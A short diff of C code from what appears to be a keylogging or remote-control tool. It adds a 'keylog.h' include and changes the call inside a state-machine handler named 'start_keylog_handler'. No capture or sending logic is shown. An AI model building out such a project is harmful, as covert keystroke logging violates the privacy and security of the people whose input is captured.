@@ -1,4 +1,5 @@
 #include "fsm.h"
+#include "keylog.h"
 #include "menu_options.h"
 #include "rename.h"
 #include "udp.h"
@@ -223,7 +224,7 @@ static int start_keylog_handler(struct fsm_context *context, struct fsm_error *e
 
     SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");
 
-    if (start_keylogger(ctx->args->ip_info) != 0)
+    if (start_keylogging() != 0)
     {
         return STATE_ERROR;
     }
